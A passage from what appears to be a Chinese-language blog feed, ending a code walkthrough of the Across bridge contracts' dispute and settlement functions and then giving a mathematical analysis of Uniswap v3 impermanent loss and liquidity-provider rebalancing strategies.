relayData.proposerBond;</span><br><span class="line">      pendingReserves -= depositData.amount;</span><br><span class="line">      delete relays[depositHash];</span><br><span class="line">      if (success) emit RelayDisputed(depositHash, _getRelayDataHash(relayData), msg.sender);</span><br><span class="line">      else emit RelayCanceled(depositHash, _getRelayDataHash(relayData), msg.sender);</span><br><span class="line">  &#125;</span><br></pre></td></tr></table></figure><p>其中， <code>_requestProposeDispute</code> 的函数内容如下：</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">  // 向 optimistic oracle 提议与 `customAncillaryData` 相关的中继事件的新价格为真。</span><br><span class="line">// 如果有人不同意中继参数，不管他们是否映射到 L2 存款，他们可以与预言机争议。</span><br><span class="line">  function _requestProposeDispute(</span><br><span class="line">      address proposer,</span><br><span class="line">      address disputer,</span><br><span class="line">      uint256 proposerBond,</span><br><span class="line">      uint256 finalFee,</span><br><span class="line">      bytes memory customAncillaryData</span><br><span class="line">  ) private returns (bool) &#123;</span><br><span class="line">      uint256 totalBond = finalFee + proposerBond;</span><br><span class="line">      l1Token.safeApprove(address(optimisticOracle), totalBond);</span><br><span class="line">      try</span><br><span class="line">          optimisticOracle.requestAndProposePriceFor(</span><br><span class="line">              identifier,</span><br><span class="line">              uint32(getCurrentTime()),</span><br><span class="line">              customAncillaryData,</span><br><span class="line">              IERC20(l1Token),</span><br><span class="line">              // 将奖励设置为 0，因为在中继提案经过挑战期后，我们将直接从该合约中结算提案人奖励支出。</span><br><span class="line">              0,</span><br><span class="line">              // 为价格请求设置 Optimistic oracle 提议者保证金。</span><br><span class="line">              proposerBond,</span><br><span class="line">              // 为价格请求设置 Optimistic oracle 活跃时间。</span><br><span class="line">              optimisticOracleLiveness,</span><br><span class="line">              proposer,</span><br><span class="line">              // 表示 &quot;True&quot;; 及提议的中继是合法的</span><br><span class="line">              int256(1e18)</span><br><span class="line">          )</span><br><span class="line">      returns (uint256 bondSpent) &#123;</span><br><span class="line">          if (bondSpent &lt; totalBond) &#123;</span><br><span class="line">              // 如果 Optimistic oracle 拉取得更少（由于最终费用的变化），则退还提议者。</span><br><span class="line">              uint256 refund = totalBond - bondSpent;</span><br><span class="line">              l1Token.safeTransfer(proposer, refund);</span><br><span class="line">              l1Token.safeApprove(address(optimisticOracle), 0);</span><br><span class="line">              totalBond = bondSpent;</span><br><span class="line">          &#125;</span><br><span class="line">      &#125; catch &#123;</span><br><span class="line">          // 如果 Optimistic oracle 中出现错误，这意味着已经更改了某些内容以使该请求无可争议。</span><br><span class="line">// 为确保请求不会默认通过，退款提议者并提前返回，允许调用方法删除请求，但 Optimistic oracle 没有额外的追索权。</span><br><span class="line">          l1Token.safeTransfer(proposer, totalBond);</span><br><span class="line">          l1Token.safeApprove(address(optimisticOracle), 0);</span><br><span class="line"></span><br><span class="line">          // 提早返回，注意到提案+争议的尝试没有成功。</span><br><span class="line">          return false;</span><br><span class="line">      &#125;</span><br><span class="line"></span><br><span class="line">      SkinnyOptimisticOracleInterface.Request memory request =</span><br><span class="line">          SkinnyOptimisticOracleInterface.Request(&#123;</span><br><span class="line">              proposer: proposer,</span><br><span class="line">              disputer: address(0),</span><br><span class="line">              currency: IERC20(l1Token),</span><br><span class="line">              settled: false,</span><br><span class="line">              proposedPrice: int256(1e18),</span><br><span class="line">              resolvedPrice: 0,</span><br><span class="line">              expirationTime: getCurrentTime() + optimisticOracleLiveness,</span><br><span class="line">              reward: 0,</span><br><span class="line">              finalFee: totalBond - proposerBond,</span><br><span class="line">              bond: proposerBond,</span><br><span class="line">              customLiveness: uint256(optimisticOracleLiveness)</span><br><span class="line">          &#125;);</span><br><span class="line"></span><br><span class="line">      // 注意：在此之前不要提取资金，以避免任何不需要的转账。</span><br><span class="line">      l1Token.safeTransferFrom(msg.sender, address(this), totalBond);</span><br><span class="line">      l1Token.safeApprove(address(optimisticOracle), totalBond);</span><br><span class="line">      // 对我们刚刚发送的请求提出争议。</span><br><span class="line">      optimisticOracle.disputePriceFor(</span><br><span class="line">          identifier,</span><br><span class="line">          uint32(getCurrentTime()),</span><br><span class="line">          customAncillaryData,</span><br><span class="line">          request,</span><br><span class="line">          disputer,</span><br><span class="line">          address(this)</span><br><span class="line">      );</span><br><span class="line"></span><br><span class="line">      // 返回 true 表示提案 + 争议调用成功。</span><br><span class="line">      return true;</span><br><span class="line">  &#125;</span><br></pre></td></tr></table></figure><p>最后，我们来看看 <code>settleRelay</code>。</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">  // 如果待处理中继价格请求在 OptimisticOracle 上有可用的价格，则奖励中继者，并将中继标记为完成。</span><br><span class="line"> // 我们使用 relayData 和 depositData 来计算中继价格请求在 OptimisticOracle 上唯一关联的辅助数据。</span><br><span class="line">// 如果传入的价格请求与待处理的中继价格请求不匹配，那么这将恢复(revert)。</span><br><span class="line">function settleRelay(DepositData memory depositData, RelayData memory relayData) public nonReentrant() &#123;</span><br><span class="line">      bytes32 depositHash = _getDepositHash(depositData);</span><br><span class="line">      _validateRelayDataHash(depositHash, relayData);</span><br><span class="line">      require(relayData.relayState == RelayState.Pending, &quot;Already settled&quot;);</span><br><span class="line">      uint32 expirationTime = relayData.priceRequestTime + optimisticOracleLiveness;</span><br><span class="line">      require(expirationTime &lt;= getCurrentTime(), &quot;Not settleable yet&quot;);</span><br><span class="line"></span><br><span class="line">      // 注意：此检查是为了给中继者一小段但合理的时间来完成中继，然后再被其他人“偷走”。</span><br><span class="line">// 这是为了确保有动力快速解决中继。</span><br><span class="line">      require(</span><br><span class="line">          msg.sender == relayData.slowRelayer || getCurrentTime() &gt; expirationTime + 15 minutes,</span><br><span class="line">          &quot;Not slow relayer&quot;</span><br><span class="line">      );</span><br><span class="line"></span><br><span class="line">      // 将中继状态更新为已完成。 这可以防止中继的任何重新设处理。</span><br><span class="line">      relays[depositHash] = _getRelayDataHash(</span><br><span class="line">          RelayData(&#123;</span><br><span class="line">              relayState: RelayState.Finalized,</span><br><span class="line">              slowRelayer: relayData.slowRelayer,</span><br><span class="line">              relayId: relayData.relayId,</span><br><span class="line">              realizedLpFeePct: relayData.realizedLpFeePct,</span><br><span class="line">              priceRequestTime: relayData.priceRequestTime,</span><br><span class="line">              proposerBond: relayData.proposerBond,</span><br><span class="line">              finalFee: relayData.finalFee</span><br><span class="line">          &#125;)</span><br><span class="line">      );</span><br><span class="line"></span><br><span class="line">      // 奖励中继者并支付 l1Recipient。</span><br><span class="line">       // 此时有两种可能的情况：</span><br><span class="line">       // - 这是一个慢速中继：在这种情况下，a) 向慢速中继者支付奖励 b) 向 l1Recipient 支付</span><br><span class="line">       //   金额减去已实现的 LP 费用和慢速中继费用。 转账没有加快，所以没有即时费用。</span><br><span class="line">       // - 这是一个即时中继：在这种情况下，a) 向慢速中继者支付奖励 b) 向即时中继者支付</span><br><span class="line">       //   全部桥接金额，减去已实现的 LP 费用并减去慢速中继费用。</span><br><span class="line">//    当即时中继者调用 speedUpRelay 时，它们存入的金额相同，减去即时中继者费用。</span><br><span class="line">//    结果，他们实际上得到了加速中继时所花费的费用 + InstantRelayFee。</span><br><span class="line"></span><br><span class="line">      uint256 instantRelayerOrRecipientAmount =</span><br><span class="line">          depositData.amount -</span><br><span class="line">              _getAmountFromPct(relayData.realizedLpFeePct + depositData.slowRelayFeePct, depositData.amount);</span><br><span class="line"></span><br><span class="line">      // 如果即时中继参数与批准的中继相匹配，则退款给即时中继者。</span><br><span class="line">      bytes32 instantRelayHash = _getInstantRelayHash(depositHash, relayData);</span><br><span class="line">      address instantRelayer = instantRelays[instantRelayHash];</span><br><span class="line"></span><br><span class="line">      // 如果这是 WETH 池并且即时中继者是地址 0x0（即中继没有加速），那么：</span><br><span class="line">      // a) 将 WETH 提取到 ETH 和 b) 将 ETH 发送给接收者。</span><br><span class="line">      if (isWethPool &amp;&amp; instantRelayer == address(0)) &#123;</span><br><span class="line">          _unwrapWETHTo(depositData.l1Recipient, instantRelayerOrRecipientAmount);</span><br><span class="line">          // 否则，这是一个正常的慢速中继正在完成，合约将 ERC20 发送给接收者，</span><br><span class="line">// 或者这是一个即时中继的最终完成，我们需要用 WETH 偿还即时中继者。</span><br><span class="line">      &#125; else</span><br><span class="line">          l1Token.safeTransfer(</span><br><span class="line">              instantRelayer != address(0) ? instantRelayer : depositData.l1Recipient,</span><br><span class="line">              instantRelayerOrRecipientAmount</span><br><span class="line">          );</span><br><span class="line"></span><br><span class="line">      // 需要支付费用和保证金。费用归解决者。保证金总是归到慢速中继者。</span><br><span class="line">      // 注意：为了 gas 效率，我们使用 `if`，所以如果它们是相同的地址，我们可以合并这些转账。</span><br><span class="line">      uint256 slowRelayerReward = _getAmountFromPct(depositData.slowRelayFeePct, depositData.amount);</span><br><span class="line">      uint256 totalBond = relayData.finalFee + relayData.proposerBond;</span><br><span class="line">      if (relayData.slowRelayer == msg.sender)</span><br><span class="line">          l1Token.safeTransfer(relayData.slowRelayer, slowRelayerReward + totalBond);</span><br><span class="line">      else &#123;</span><br><span class="line">          l1Token.safeTransfer(relayData.slowRelayer, totalBond);</span><br><span class="line">          l1Token.safeTransfer(msg.sender, slowRelayerReward);</span><br><span class="line">      &#125;</span><br><span class="line"></span><br><span class="line">      uint256 totalReservesSent = instantRelayerOrRecipientAmount + slowRelayerReward;</span><br><span class="line"></span><br><span class="line">      // 按更改的金额和分配的 LP 费用更新储备。</span><br><span class="line">      pendingReserves -= depositData.amount;</span><br><span class="line">      liquidReserves -= totalReservesSent;</span><br><span class="line">      utilizedReserves += int256(totalReservesSent);</span><br><span class="line">      bonds -= totalBond;</span><br><span class="line">      _updateAccumulatedLpFees();</span><br><span class="line">      _allocateLpFees(_getAmountFromPct(relayData.realizedLpFeePct, depositData.amount));</span><br><span class="line"></span><br><span class="line">      emit RelaySettled(depositHash, msg.sender, relayData);</span><br><span class="line"></span><br><span class="line">      // 清理状态存储并获得gas退款。</span><br><span class="line">// 这也可以防止 `priceDisputed()` 重置这个新的 Finalized 中继状态。</span><br><span class="line">      delete instantRelays[instantRelayHash];</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  function _allocateLpFees(uint256 allocatedLpFees) internal &#123;</span><br><span class="line">      undistributedLpFees += allocatedLpFees;</span><br><span class="line">      utilizedReserves += int256(allocatedLpFees);</span><br><span class="line">  &#125;</span><br></pre></td></tr></table></figure><p>至此，我们分析完了 Across 合约的主要功能的代码。</p><h2><span id="he-yue-bu-shu">合约部署</span></h2><p>部署合约目录 <code>deploy</code> 下包含 8 脚本，依次部署了管理合约，WETH 桥接池，Optimism，Arbitrum和Boba的信使，以及 Arbitrum，Optimism 和 Boba 的存款合约。由于过程比较简单，这里就不仔细分析了。</p><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">deploy/</span><br><span class="line">├── 001_deploy_across_bridge_admin.js</span><br><span class="line">├── 002_deploy_across_weth_bridge_pool.js</span><br><span class="line">├── 003_deploy_across_optimism_wrapper.js</span><br><span class="line">├── 004_deploy_across_optimism_messenger.js</span><br><span class="line">├── 005_deploy_across_arbitrum_messenger.js</span><br><span class="line">├── 006_deploy_across_boba_messenger.js</span><br><span class="line">├── 007_deploy_across_ovm_bridge_deposit_box.js</span><br><span class="line">└── 008_deploy_across_avm_deposit_box.js</span><br></pre></td></tr></table></figure><h2><span id="zong-jie">总结</span></h2><p>Across 协议整体结构简单，流程清晰，支持了 Across 协议安全，快速的从 L2 向 L1 的资金转移。</p><p>代码中调用了 Optimistic Oracle 的接口来出和解决争议，对应的逻辑有空之后详说。</p><h3><span id="comments">Comments</span></h3>]]></content>
    
    <summary type="html">
    
      Across 跨链桥合约解析
    
    </summary>
    
    
      <category term="区块链" scheme="https://qiwihui.com/tags/%E5%8C%BA%E5%9D%97%E9%93%BE/"/>
    
  </entry>
  
  <entry>
    <title>Uniswap v3 无常损失分析</title>
    <link href="https://qiwihui.com/qiwihui-blog-165/"/>
    <id>https://qiwihui.com/qiwihui-blog-165/</id>
    <published>2024-05-15T02:25:31.348Z</published>
    <updated>2024-05-15T02:25:31.468Z</updated>
    
    <content type="html"><![CDATA[<h1><span id="uniswap-v3-wu-chang-sun-shi-fen-xi">Uniswap v3 无常损失分析</span></h1><h2><span id="mu-biao">目标</span></h2><ol><li>对 Uniswap v3 无常损失的定量分析；</li><li>如何使用策略让 Uniswap v3 LP 获得更大的收益。</li></ol><span id="more"></span><h2><span id="uniswap-gai-lan">Uniswap 概览</span></h2><p>基于恒定乘积的自动化做市商（AMM），去中心化交易所。</p><p><strong>v1 版本:</strong></p><ul><li>2018年11月</li><li>解决了什么问题：传统交易所 order book 买卖双方不活跃导致的长时间挂单，交易效率低下</li><li>功能：ETH ←→ ERC20 token 兑换</li><li>带来的问题：<ul><li>token1 与 token2 之间的兑换需要借助 ETH<ul><li>USDT → ETH → USDC</li></ul></li></ul></li></ul><p><strong>v2 版本:</strong></p><ul><li>2020年5月</li><li>新功能<ul><li>自由组合交易对：token1 ←→ token2<ul><li>token1-token2 交易池</li></ul></li><li>LPers 提供流动性并赚取费用</li><li>价格预言机（时间加权平均价格，TWAP）、闪电贷、最优化交易路径等</li></ul></li><li>带来的问题<ul><li>资金利用率低：<ul><li>在 <code>x*y=k</code> 的情况下，做市的价格区间在 (0, +∞) 的分布，当用户交易时，交易的量相比我们的流动性来说是很小的</li><li>假设 ETH/DAI 交易对的实时价格为 1500 DAI/ETH，交易对的流动性池中共有资金：4500 DAI 和 3 ETH，根据 <code>x⋅y=k</code>，可以算出池内的 k 值： <code>k=4500×3=13500</code>。假设 x 表示 DAI，y 表示 ETH，即初始阶段 x1=4500，y1=3，当价格下降到 1300 DAI/ETH 时： <code>x2⋅y2=13500, x2/y2=1300</code>，得出 <code>x2=4192.54, y2=3.22</code>，资金利用率为： <code>Δx/x1=6.84%</code>。同样的计算方式，当价格变为 2200 DAI/ETH 时，资金利用率约为 <code>21.45%</code>。也就是说，在大部分的时间内池子中的资金利用与低于 25%，这个问题对于稳定币池来说更加严重。</li></ul></li></ul></li></ul><p><img src="https://user-images.githubusercontent.com/3297411/190839344-efc05df3-293a-422e-bc22-b26311154b12.png" alt="Untitled"></p><p><strong>v3版本:</strong></p><ul><li>2021年5月</li><li>考虑风险<ol><li>价格影响（Price impact）：<ul><li>是指一笔交易对价格的影响程度，取决于池子深度。 更高的价格影响意味着：流动性提供者提供的流动性不足，向交易者提供更差的比率（滑点高）。</li></ul></li><li>存货风险（Inventory risk）：<ul><li>LP 的主要目标是随着时间的推移增加其总库存价值</li><li>在价格变化过程中，相对于首选价值存储的资产而言，LP 拥有的资产数量更少，比如对于 ETH-DAI，用户更倾向于 ETH（ETH价格升高），相对于 ETH而言，LP 拥有越多的 DAI，存货风险越高；</li><li>比如 100% ETH 和 50%-50% ETH-DAI 的对比，ETH价格上涨，更多人将 DAI 换成 ETH，相对应LP手中 ETH就少了，风险加大。</li></ul></li><li>无常损失<ul><li>提供流动性时发生的资金暂时损失/非永久性损失；</li><li>只要代币相对价格恢复到其初始状态，该损失就消失了；</li></ul></li></ol></li><li>新功能<ul><li>集中流动性 →  提升资金利用率</li></ul></li></ul><p><img src="https://user-images.githubusercontent.com/3297411/190839359-483c9ed2-e79f-4be9-b489-0af0d86c62b6.png" alt="Untitled 1"></p><pre><code>- 多层级手续费率（0.05%，0.3%，1%），升级的预言机，区间订单（range order）等。</code></pre><ul><li>带来的问题：<ul><li>相对于v2而言<ul><li>无常损失（Impermanent Loss）仍然存在，而且更大；</li><li>LP 的权衡<ul><li>价格区间越大，所获得的费用收益就越低，(0, +∞)时和 v2一致。</li><li>但如果选择一个更小的价格区间，就会有更高的无常损失。</li></ul></li></ul></li></ul></li></ul><h2><span id="wu-chang-sun-shi-fen-xi">无常损失分析</span></h2><h3><span id="uniswap-v2">Uniswap v2</span></h3><p><strong>例子：</strong></p><p>假设 ETH/DAI 交易对的实时价格为 1500 DAI/ETH，交易对的流动性池中共有资金：4500 DAI 和 3 ETH，根据 <code>x⋅y=k</code>，可以算出池内的 k 值： <code>k=4500×3=13500</code>。假设 x 表示 DAI，y 表示 ETH，即初始阶段 x1=4500，y1=3。</p><p>当价格下降到 1300 DAI/ETH 时： <code>x2⋅y2=13500, x2/y2=1300</code>，得出 <code>x2=4192.54, y2=3.22</code> 。</p><p>如果用户选择HODL，则 <code>x2'=4500，y2'=3</code>，我们分别计算两种情况下的资产价值（DAI）：</p><p>LP: 4192.54 + 3.22 * 1300 = 8378.54</p><p>HODL: 4500 + 3 * 1300 = 8400</p><p>资产减少：8400 - 8378.54 = 21.46 → 无常损失</p><p>无常损失率：21.46 / 8400 = 0.26%</p><p>当价格变为 2200 DAI/ETH时，x2=5449.77, y2=2.48，资产减少 194.23，损失率为 1.75%。</p><p><strong>模型分析：</strong></p><p>根据恒定乘积公式 $xy=k$，令 $k=L^2$，其中 L 表示流动性，则有 $xy=L^2$，再根据价格 $S=x/y$，可以得到 $x=L/\sqrt{S}$，$y=L\sqrt{S}$。</p><p>考虑 LP 在流动性池 X-Y 中添加流动性 $L$，池的初始价格为 $S_0$，所以 LP 需要向流动性池中提供 $x_0=L/\sqrt{S_0}$的 X 代币和 $y_0=L\sqrt{S_0}$ 的 Y 代币。</p><p>当池的价格变为 $S_1$时，LP 的资产价值为</p><p>$$V_{v2,pos}(L, S_1)=S_1 \cdot x_1+y_1=\frac{L}{\sqrt{S_1}}S_1+L\sqrt{S_1}=2L\sqrt{S_1}$$</p><p>其中 $x_1$和 $y_1$是LP在池中的资产。</p><p>LP 初始时的资产如果一直拿手里，则价值为</p><p>$$V_{v2,hold}(L,S_0,S_1)=S_1 \cdot x_0 + y_0=\frac{L}{\sqrt{S_0}}S_1+L\sqrt{S_0}$$</p><p>所以，无常损失为：</p><p>$$\begin{aligned}\mathrm{IL}<em>{\mathrm{v} 2}\left(S_0, S_1\right) &amp;=\frac{V</em>{\mathrm{v} 2, \text { pos }}-V_{\mathrm{v} 2, \text { hold }}}{V_{\mathrm{v} 2, \text { hold }}} \&amp;=\frac{2 L \sqrt{S_1}-\left(\frac{L}{\sqrt{S_0}} S_1+L \sqrt{S_0}\right)}{\frac{L}{\sqrt{S_0}} S_1+L \sqrt{S_0}} \&amp;=\left(\frac{2 \cdot \sqrt{\frac{S_1}{S_0}}}{1+\frac{S_1}{S_0}}-1\right)\end{aligned}$$</p><p>令 $r=S_1/S_0$，则有：</p><p>$$\mathrm{IL}_{v2} = \frac{2 \cdot \sqrt{r}}{1+r}-1$$</p><p>用之前的例子计算，r=1300/1500=0.87时，IL=0.0026=0.26%，r=2200/1500=1.47时，IL=0.018=1.8%，与上述计算相符合。</p><p><strong>图像：</strong></p><p><img src="https://user-images.githubusercontent.com/3297411/190839374-f568b419-7536-44d0-b988-13dd4982972a.png" alt="Untitled 2"></p><p><a href="https://www.desmos.com/calculator/aza5py3g95">https://www.desmos.com/calculator/aza5py3g95</a></p><p>可以看到，当 $S_0=S_1$时无常损失为0，其他时候无常损失都为负数。列一个表：</p><table><thead><tr><th>价格变化</th><th>无常损失</th></tr></thead><tbody><tr><td>0.25x</td><td>20.0%</td></tr><tr><td>0.5x</td><td>5.7%</td></tr><tr><td>0.75x</td><td>1.0%</td></tr><tr><td>1</td><td>0</td></tr><tr><td>1.25x</td><td>0.6%</td></tr><tr><td>1.5x</td><td>2.0%</td></tr><tr><td>1.75x</td><td>3.8%</td></tr><tr><td>2x</td><td>5.7%</td></tr><tr><td>3x</td><td>13.4%</td></tr><tr><td>4x</td><td>20.0%</td></tr><tr><td>5x</td><td>25.5%</td></tr></tbody></table><h3><span id="uniswap-v3">Uniswap v3</span></h3><p>用同样的过程，我们分析 Uniswap v3的无常损失。假设 LP 向价格区间 $[P_a,P_b]$提供流动性  $L$，初始价格为 $P_0(\in[P_a,P_b])$，之后价格变为 $P_1(\in[P_a,P_b])$。</p><p>首先我们从Uniswap v3 的白皮书中可以知道，集中流动性的资产储备曲线（橙色）的公式为：</p><p>$$\left(x+\frac{L}{\sqrt{p_b}}\right)\left(y+L \sqrt{p_a}\right)=L^2$$</p><p>（推导：曲线相当于v2的曲线向左向下平移动）</p><p><img src="https://user-images.githubusercontent.com/3297411/190839406-4880142e-70e3-4073-973f-1f9d8830449c.png" alt="Untitled 1"></p><p>对于虚拟曲线: $x_{virtual} \cdot y_{virtual} = L^2$，可以得到：</p><p>$$\begin{aligned}&amp;y=y_{\text {virtual }}-L \sqrt{p_a}=L\left(\sqrt{P}-\sqrt{p_a}\right) \&amp;x=x_{\text {virtual }}-\frac{L}{\sqrt{p_b}}=L\left(\frac{1}{\sqrt{P}}-\frac{1}{\sqrt{p_b}}\right)\end{aligned}$$</p><p>初始时资产价值为：</p><p>$$\begin{aligned}V_{v3}(P_0) &amp;=y_0+x_0 \cdot P_0 \&amp;=L\left(\sqrt{P_0}-\sqrt{p_a}\right)+L\left(\sqrt{P_0}-\frac{P_0}{\sqrt{p_b}}\right) \&amp;=2 L \sqrt{P_0}-L\left(\sqrt{p_a}+\frac{P_0}{\sqrt{p_b}}\right)\end{aligned}$$</p><p>同样，则在价格 $P_1$时流动池中的资产价值为（令 $r=P_1/P_0$）：</p><p>$$\begin{aligned}V_{v3,pos}(P_1) &amp;=2 L \sqrt{P_1}-L\left(\sqrt{p_a}+\frac{P_1}{\sqrt{p_b}}\right) \ &amp;=2 L \sqrt{rP_0}-L\left(\sqrt{p_a}+\frac{rP_0}{\sqrt{p_b}}\right)\end{aligned}$$</p><p>在价格为 $P_1$ 时的，选择 HODL 的资产价值为：</p><p>$$\begin{aligned}V_{\text {v3,hold}}(P_1) &amp;=y_0+x_0 P_1 \&amp;=L\left(\sqrt{P_0}-\sqrt{p_a}\right)+P_1 \cdot L\left(\frac{1}{\sqrt{P_0}}-\frac{1}{\sqrt{p_b}}\right) \&amp;=L\left(\sqrt{P_0}-\sqrt{p_a}\right)+L \cdot rP _0\left(\frac{1}{\sqrt{P_0}}-\frac{1}{\sqrt{p_b}}\right) \&amp;=L \sqrt{P_0}(1+r)-L\left(\sqrt{p_a}+\frac{rP_0 }{\sqrt{p_b}}\right)\end{aligned}$$</p><p>所以无常损失为（不失一般性，取 $P_0$为 $P$）：</p><p>$$\begin{aligned}\mathrm{IL}<em>{a, b}® &amp;=\frac{V</em>{pos}-V_{\text {hold }}}{V_{\text {hold }}} \&amp;=\frac{2 L \sqrt{rP}-L \sqrt{P}(1+r)}{L \sqrt{P}(1+r)-L\left(\sqrt{p_a}+\frac{rP}{\sqrt{p_b}}\right)} \&amp;=\frac{2 \sqrt{r}-1-r}{1+r-\sqrt{\frac{p_a}{P}}-r \sqrt{\frac{P}{p_b}}} \&amp;=\operatorname{IL}® \cdot\left(\frac{1}{1-\frac{\sqrt{\frac{p_a}{P}}+r \sqrt{\frac{P}{p_b}}}{1+r}}\right)\end{aligned}$$</p><p>（ $P_1$ 在价格区间 $[0,P_b]$，$[P_a,+\infty]$时的无常损失也同样可以计算。）</p><p>我们可以通过价格区间 $[P_a, P_b]$ 的变化看到：</p><ol><li>在 $P_a=P_b=P$时， IL = 0；</li><li>当 $r=1$ 时， IL = 0；</li><li>与 v2 的联系：</li></ol><p>$$p_a=0, p_b \rightarrow \infty, \mathrm{IL}<em>{v3}=\frac{2 \cdot \sqrt{r} -1-r}{1+r}=\mathrm{IL}</em>{v2}$$</p><p>趋近于 $\mathrm{IL}_{v2}$。</p><p><strong>画图</strong></p><p><img src="https://user-images.githubusercontent.com/3297411/190839418-ebe47fa1-2446-431d-bceb-1e01ddd454a4.png" alt="Untitled 3"></p><p><a href="https://www.desmos.com/calculator/ha322rtufc">https://www.desmos.com/calculator/ha322rtufc</a></p><p>同样我们可以看到：当价格区间越小时，无常损失越大：</p><p>（这是一个动图）</p><p><img src="https://user-images.githubusercontent.com/3297411/190839425-25812665-4d4c-4b3a-bb0e-38378036b31d.gif" alt="Untitled"></p><p>数值<strong>比较</strong></p><p>我们比较在不同的价格区间下 Uniswap v3的无常损失：</p><img width="757" alt="Screen_Shot_2022-08-31_at_09 56 06" src="https://user-images.githubusercontent.com/3297411/190839436-dc4969bd-51d7-4a30-a86e-9d50930fdc85.png"><p>具体数据（）：</p><table><thead><tr><th>价格区间%</th><th>-20%</th><th>Initial</th><th>+20%</th></tr></thead><tbody><tr><td>[0%,Inf]( Uniswap v2 )</td><td>-0.56%</td><td>0</td><td>-0.46%</td></tr><tr><td>[0%, 200%]</td><td>-0.86%</td><td>0</td><td>-0.70%</td></tr><tr><td>[25%, 175%]</td><td>-1.5%</td><td>0</td><td>-1.22%</td></tr><tr><td>[50%, 150%]</td><td>-2.34%</td><td>0</td><td>-1.91%</td></tr><tr><td>[75%, 125%]</td><td>-4.75%</td><td>0</td><td>-3.8%</td></tr></tbody></table><p>提问：既然无常损失总是为负，为什么还是会有人愿意做 LP？</p><p>我们的计算忽略了两个问题：</p><ol><li>手续费（fee）：不同的池子提供不同的手续费，需要在原来的计算上加上手续费。</li><li>集中流动性增加了池的深度：<ul><li><p>例如：ETH-USDC-0.3%池的流动性</p><p><img src="https://user-images.githubusercontent.com/3297411/190839469-259db8d9-b51e-47c9-8444-06399598866e.png" alt="Untitled 4"></p></li><li><p>一些流行的 token 对的深度比中心化交易所（Binance, Coinbase）更高。<a href="https://uniswap.org/blog/uniswap-v3-dominance">link</a></p><ul><li><p>large-cap: ETH/dollar</p></li><li><p>mid-cap - cross-chain pairs</p><p><img src="https://user-images.githubusercontent.com/3297411/190839462-ae80daf8-398c-4dac-bc90-482a62fd3388.png" alt="Untitled 5"></p></li></ul></li></ul></li></ol><pre><code>    - 稳定币与稳定币对: USDC/USDT</code></pre><h3><span id="cong-zi-chan-jie-zhi-de-jiao-du"><strong>从资产价值的角度</strong></span></h3><p>比较以下五种资产持有策略</p><ol><li>100% 持有 ETH</li><li>100% 持有 USDC</li><li>50% 持有 ETH，50% 持有 USDC</li><li>使用 50%ETH 与 50%USDC 参与做市 - Uniswap v2</li><li>使用 50%ETH 与 50%USDC 参与做市 - Uniswap v3</li></ol><p>比较这五种策略的资产价值。（使用 <a href="https://defi-lab.xyz/uniswapv3simulator">https://defi-lab.xyz/uniswapv3simulator</a>）</p><p>无手续费时：</p><img width="838" alt="Untitled 6" src="https://user-images.githubusercontent.com/3297411/190839480-ae2dbd81-24c7-4692-8ec5-c682b28937ea.png"><p>包含手续费时：</p><p><img src="https://user-images.githubusercontent.com/3297411/190839487-0004de8e-9500-42e6-95dd-3cf5dca0e737.png" alt="Untitled 7"></p><p>Uniswap V3 既是投资者收益的放大器，也是风险的放大器。在享受更高投资收益的同时，也必然要承担当价格脱离安全范围时更多的无常损失。</p><h2><span id="ru-he-tong-guo-ce-lue-jiang-di-sun-shi-huo-zhe-shuo-zeng-jia-shou-yi">如何通过策略降低损失，或者说增加收益？</span></h2><h3><span id="ce-lue-0-zai-bu-zhu-dong-diao-zheng-de-qing-kuang-xia-xuan-ze-bi-v2-biao-xian-geng-hao-de-chi-zi">策略0：在不主动调整的情况下选择比v2表现更好的池子</span></h3><p>在不主动调整情况下，全范围（full range）的 Uniswap v3 头寸和价格限定的稳定币头寸的手续费回报平均比 Uniswap v2 好约 54%。其中</p><ul><li>100 基点手续费的全范围 v3 头寸比 v2 平均<strong>好</strong> ~80%。</li><li>1 基点，范围限定的 v3 稳定币对，v2 ，平均<strong>好</strong> ~160%.</li><li>30 基点，全范围 v3 头寸， v2 平均<strong>好</strong> ~16%.</li><li>5 基点，全范围 v3 头寸，v2  平均<strong>差</strong> ~68%.</li></ul><p>通常建议 LPers 选择 v3。<a href="https://uniswap.org/blog/fee-returns">link</a></p><p>选择哪个池？</p><p><img src="https://user-images.githubusercontent.com/3297411/190839496-8d41b11a-d26a-479c-8441-c481f3aa26e9.png" alt="Untitled 8"></p><p>v3 表现更好的是 100 基点费率或 1 基点费率的稳定币对。</p><p>100 bps 的 token 对通常流动性较差，部署时间较晚且波动性较大。 对于 1-bp 费用等级，代币对价格波动较小，但 Uniswap v3 的交易量远高于 v2。 1-bp 池上的集中流动性实现了超过 v2 的高回报。</p><h3><span id="ce-lue-yi-zhu-dong-de-bei-dong-ce-lue">策略一：主动的被动策略</span></h3><p>如果初始投入是 50%ETH 和50%USDC，当价格变化时，池中剩余的资产比例可能变成 80%ETH 和 20%USDC，这时你需要手动调整库存来防止出现一种资产在一侧耗尽，可以持续提供两边的库存。</p><p>根据价格变动周期性地再平衡（rebalance）两种资产之间的比例。</p><p>利用范围订单（range order）被动执行的，在现在价格的预测方向放置一个窄的订单，这样就避免了swap费用和价格影响。如果主动使用 swap 达到 50/50，会有 0.3%的费用。</p><p><strong>如何操作：</strong></p><p>对于 Uniswap 上为某个矿池，例如 ETH/USDC，它有两个主要参数：</p><ul><li>B（基本阈值）</li><li>R（再平衡阈值）</li></ul><p>该策略始终保持两个有效的范围订单：</p><ul><li>基本定单：以当前价格 X 为中心，范围 [X-B, X+B]。 如果 B 较低，它将从交易费用中获得更高的收益。</li><li>再平衡订单：刚好高于或低于当前价格。在 [X-R, X] 或 [X, X+R] 范围内，具体取决于在基本订单下达后它持有的更多的代币是哪一种。 此订单有助于策略重新平衡并接近 50/50 以降低库存风险。</li></ul><p>每24小时，进行再平衡，根据价格和token数量提交订单。如果策略表现优秀，则时间区间可以被减少。再平衡并不能保证完全50/50。</p><p><strong>举例：</strong></p><p><img src="https://user-images.githubusercontent.com/3297411/190839504-426e6004-c3f3-4101-8a08-c507915c9d20.png" alt="Untitled 9"></p><p>比如，ETH目前价格 150USDC，B=50，R=20，策略拥有资金 1ETH 和160USDC。则在 [100, 200] 放置一个基础订单，使用 1ETH 和 150 USDC。剩余的 10 USDC 用来在 [130,150] 放置一个在平衡订单，用来购买ETH以达到50/50。</p><p><img 